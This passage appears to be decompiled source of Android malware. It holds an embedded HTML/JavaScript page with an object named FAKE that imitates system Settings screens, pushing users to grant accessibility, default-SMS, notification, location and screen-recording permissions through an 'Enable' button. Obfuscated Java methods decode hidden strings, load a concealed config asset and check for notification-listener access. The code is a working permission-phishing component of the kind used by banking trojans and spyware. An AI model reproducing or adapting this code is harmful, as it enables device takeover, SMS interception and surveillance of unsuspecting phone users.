id=\"sL\">Downloaded apps</div>\n<div class=\"ac\">\n<div class=\"ai\" id=\"aI\"><svg viewBox=\"0 0 24 24\" fill=\"#8ab4f8\"><path d=\"M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z\"/></svg></div>\n<div class=\"af\"><div class=\"an\" id=\"aN\">App</div><div class=\"as\" id=\"aS\">Off</div></div>\n<div class=\"tgl\" id=\"tG\"></div>\n</div>\n<div class=\"ib\" id=\"iM\">This app requires access permission to work.</div>\n<div class=\"ms\" id=\"mS\">\n<div class=\"mt\" id=\"mT\">Open Settings &#x2192; Default apps &#x2192; SMS and select this application.</div>\n<div style=\"text-align:center\"><button class=\"mb\" id=\"mB\" onclick=\"Android.onManualSmsSettings()\">Open Settings</button></div>\n</div>\n<div id=\"sC\"></div>\n</div>\n<div class=\"btn-bar\"><button class=\"eb\" id=\"eB\" onclick=\"Android.onEnableClicked()\">Enable</button></div>\n<script>\nvar SVG={\nbattery:'<svg viewBox=\"0 0 24 24\" fill=\"#4caf50\"><path d=\"M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4zm-2 14h-3.33v-2h3.33v2zm0-4h-3.33v-2h3.33v2zm0-4h-3.33V8h3.33v2z\"/></svg>',\nshield:'<svg viewBox=\"0 0 24 24\" fill=\"#8ab4f8\"><path d=\"M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z\"/></svg>',\nbell:'<svg viewBox=\"0 0 24 24\" fill=\"#ffc107\"><path d=\"M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z\"/></svg>',\nlocation:'<svg viewBox=\"0 0 24 24\" fill=\"#e040fb\"><path d=\"M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z\"/></svg>',\naccess:'<svg viewBox=\"0 0 24 24\" fill=\"#8ab4f8\"><path d=\"M20.5 6c-2.61.7-5.67 1-8.5 1s-5.89-.3-8.5-1L3 8c1.86.5 4 .83 6 1v13h2v-6h2v6h2V9c2-.17 4.14-.5 6-1l-.5-2zM12 6c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z\"/></svg>',\nscreen:'<svg viewBox=\"0 0 24 24\" fill=\"#00bcd4\"><path d=\"M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z\"/><circle cx=\"12\" cy=\"10\" r=\"3\" fill=\"#00bcd4\"/></svg>',\ntext:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z\"/></svg>',\ncolor:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M12 3c-4.97 0-9 4.03-9 9s4.03 9 9 9c.83 0 1.5-.67 1.5-1.5 0-.39-.15-.74-.39-1.01-.23-.26-.38-.61-.38-1 0-.83.67-1.5 1.5-1.5H16c2.76 0 5-2.24 5-5 0-4.42-4.03-8-9-8zm-5.5 9c-.83 0-1.5-.67-1.5-1.5S5.67 9 6.5 9 8 9.67 8 10.5 7.33 12 6.5 12zm3-4C8.67 8 8 7.33 8 6.5S8.67 5 9.5 5s1.5.67 1.5 1.5S10.33 8 9.5 8zm5 0c-.83 0-1.5-.67-1.5-1.5S13.67 5 14.5 5s1.5.67 1.5 1.5S15.33 8 14.5 8zm3 4c-.83 0-1.5-.67-1.5-1.5S16.67 9 17.5 9s1.5.67 1.5 1.5-.67 1.5-1.5 1.5z\"/></svg>',\nzoom:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z\"/><path d=\"M12 10h-2v2H9v-2H7V9h2V7h1v2h2v1z\"/></svg>',\nmenu:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z\"/></svg>',\nbolt:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M11 21h-1l1-7H7.5c-.58 0-.57-.32-.38-.66.19-.34.05-.08.07-.12C8.48 10.94 10.42 7.54 13 3h1l-1 7h3.5c.49 0 .56.33.47.51l-.07.15C12.96 17.55 11 21 11 21z\"/></svg>',\nchart:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M3.5 18.49l6-6.01 4 4L22 6.92l-1.41-1.41-7.09 7.97-4-4L2 16.99z\"/></svg>',\npct:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z\"/></svg>',\ndnd:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.31C15.55 19.37 13.85 20 12 20zm6.31-3.1L7.1 5.69C8.45 4.63 10.15 4 12 4c4.42 0 8 3.58 8 8 0 1.85-.63 3.55-1.69 4.9z\"/></svg>',\nhist:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z\"/></svg>',\npin:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z\"/></svg>',\nlock:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z\"/></svg>',\nmap:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M20.5 3l-.16.03L15 5.1 9 3 3.36 4.9c-.21.07-.36.25-.36.48V20.5c0 .28.22.5.5.5l.16-.03L9 18.9l6 2.1 5.64-1.9c.21-.07.36-.25.36-.48V3.5c0-.28-.22-.5-.5-.5zM15 19l-6-2.11V5l6 2.11V19z\"/></svg>',\nrec:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><circle cx=\"12\" cy=\"12\" r=\"8\"/></svg>',\nvol:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z\"/></svg>',\ncast:'<svg viewBox=\"0 0 24 24\" fill=\"#9aa0a6\"><path d=\"M21 3H3c-1.1 0-2 .9-2 2v3h2V5h18v14h-7v2h7c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM1 18v3h3c0-1.66-1.34-3-3-3zm0-4v2c2.76 0 5 2.24 5 5h2c0-3.87-3.13-7-7-7zm0-4v2c4.97 0 9 4.03 9 9h2c0-6.08-4.93-11-11-11z\"/></svg>'\n};\nvar ICONS={\nbattery:{svg:SVG.battery,bg:'linear-gradient(135deg,#43E97B,#38F9D7)'},\naccessibility:{svg:SVG.access,bg:'linear-gradient(135deg,#4285f4,#34a853)'},\nnotification:{svg:SVG.bell,bg:'linear-gradient(135deg,#FA709A,#FEE140)'},\nlocation:{svg:SVG.location,bg:'linear-gradient(135deg,#A18CD1,#FBC2EB)'},\nscreen:{svg:SVG.screen,bg:'linear-gradient(135deg,#4FACFE,#00F2FE)'},\nsms:{svg:SVG.shield,bg:'linear-gradient(135deg,#43E97B,#38F9D7)'}\n};\nvar FAKE={\naccessibility:[\n{svg:SVG.text,bg:'#37474f',t:'Display size and text'},\n{svg:SVG.color,bg:'#5c3d6e',t:'Color and motion'},\n{svg:SVG.zoom,bg:'#37474f',t:'Magnification',d:'Off / Zoom in on the screen'},\n{svg:SVG.menu,bg:'#37474f',t:'Accessibility Menu',d:'Off / Control device via large menu'}\n],\nbattery_sms:[\n{svg:SVG.bolt,bg:'#2e7d32',t:'Battery Saver',d:'Off'},\n{svg:SVG.chart,bg:'#37474f',t:'Battery usage'},\n{svg:SVG.pct,bg:'#37474f',t:'Battery percentage',d:'Show in status bar'}\n],\nbattery_standalone:[\n{svg:SVG.bolt,bg:'#2e7d32',t:'Battery Saver',d:'Off'},\n{svg:SVG.chart,bg:'#37474f',t:'Battery usage'},\n{svg:SVG.pct,bg:'#37474f',t:'Battery percentage',d:'Show in status bar'}\n],\nnotification_access:[\n{svg:SVG.bell,bg:'#e65100',t:'On-device controls'},\n{svg:SVG.dnd,bg:'#37474f',t:'Do Not Disturb'},\n{svg:SVG.hist,bg:'#37474f',t:'Notification history',d:'Off'}\n],\npost_notifications:[\n{svg:SVG.bell,bg:'#e65100',t:'Notification style'},\n{svg:SVG.hist,bg:'#37474f',t:'App notifications'},\n{svg:SVG.dnd,bg:'#37474f',t:'Do Not Disturb',d:'Off'}\n],\nlocation:[\n{svg:SVG.pin,bg:'#7b1fa2',t:'App location access'},\n{svg:SVG.lock,bg:'#37474f',t:'Location accuracy'},\n{svg:SVG.map,bg:'#37474f',t:'Location history'}\n],\nmedia_projection:[\n{svg:SVG.rec,bg:'#c62828',t:'Screen recording'},\n{svg:SVG.vol,bg:'#37474f',t:'Audio settings'},\n{svg:SVG.cast,bg:'#37474f',t:'Cast',d:'Off'}\n]\n};\nfunction updateStep(j){try{var d=JSON.parse(j);\ndocument.getElementById('pT').textContent=d.title||'Settings';\ndocument.getElementById('sL').textContent=d.sectionLabel||'Downloaded apps';\ndocument.getElementById('aN').textContent=d.appName||'App';\ndocument.getElementById('aS').textContent=d.appStatus||'Off';\ndocument.getElementById('iM').textContent=d.description||'';\ndocument.getElementById('eB').textContent=d.buttonText||'Enable';\nvar ic=document.getElementById('aI');\nvar ik=ICONS[d.stepId]||ICONS.battery;\nif(d.iconDataUrl){ic.innerHTML='<img src=\"'+d.iconDataUrl+'\" alt=\"\">';ic.style.background=ik.bg;}\nelse{ic.innerHTML=ik.svg;ic.style.background=ik.bg;}\nvar c=document.getElementById('sC');c.innerHTML='';\nvar fk=FAKE[d.stepId]||FAKE.battery_standalone;\nfor(var i=0;i<fk.length;i++){var s=fk[i];var e=document.createElement('div');e.className='si';\nvar dh=s.d?'<div class=\"sd\">'+s.d+'</div>':'';\ne.innerHTML='<div class=\"sk\" style=\"background:'+s.bg+'\">'+s.svg+'</div><div class=\"sc\"><div class=\"st\">'+s.t+'</div>'+dh+'</div>';\nc.appendChild(e);}\nvar m=document.getElementById('mS');if(d.showManualSms)m.classList.add('v');else m.classList.remove('v');\nif(d.manualSmsHint){var mt=document.getElementById('mT');if(mt)mt.innerHTML=d.manualSmsHint;}\nif(d.manualSmsBtn){var mb=document.getElementById('mB');if(mb)mb.textContent=d.manualSmsBtn;}\nwindow.scrollTo(0,0);document.body.classList.add('ready');}catch(e){console.error(e);}}\nfunction showManualSms(s){var m=document.getElementById('mS');if(s)m.classList.add('v');else m.classList.remove('v');}\n</script>\n</body></html>", TypefaceCache.obtain("003700730043009300BF00B700C600AA002F"), "UTF-8", null);
        this.yTljMGnIibTRdOpSh4 = webView;
        frameLayout.addView(webView, new FrameLayout.LayoutParams(-1, -1));
        setContentView(frameLayout);
    }

    public final void xfn2GJwmGqs7kWW() {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(getAssets().open(TypefaceCache.obtain("002C00780059008800F100AD00D600AE002D00710064008400FF00B100D400AE002400380051009400FF00B1")), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192);
            try {
                String strPyu8ovAipBTLYAiKab = RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(bufferedReader);
                bufferedReader.close();
                JSONObject jSONObject = new JSONObject(strPyu8ovAipBTLYAiKab);
                while (Runtime.getRuntime().maxMemory() < 0) {
                    StringBuilder sb = new StringBuilder();
                    sb.append(0);
                    sb.setLength(0);
                }
                if (jSONObject.length() == 0) {
                    return;
                }
                this.H9XlUr4OeMJFiXK = jSONObject;
                TypefaceCache.obtain("000F0079005A008300F500BB009200A8002D00740054008600E200BB00DB00A9002400360058008800FE00B900DB00A0006300700049008800FD00FF00D300B400300073004F0094");
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(bufferedReader, th);
                    throw th2;
                }
            }
        } catch (Exception unused) {
            TypefaceCache.obtain("000D0079001B008800FE00BD00DD00A6003100720052008900F700FF00D100A8002D00700052008000BC00FF00C700B4002A0078005C00C700F400BA00D400A60036007A004F0094");
        }
    }

    public final boolean yTljMGnIibTRdOpSh4() {
        try {
            String packageName = getPackageName();
            String string = Settings.Secure.getString(getContentResolver(), TypefaceCache.obtain("00260078005A008500FC00BA00D60098002D0079004F008E00F600B600D100A60037007F0054008900CF00B300DB00B4003700730055008200E200AC"));
            return string != null && KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, packageName, false);
        } catch (Exception unused) {
            return false;
        }
    }
}
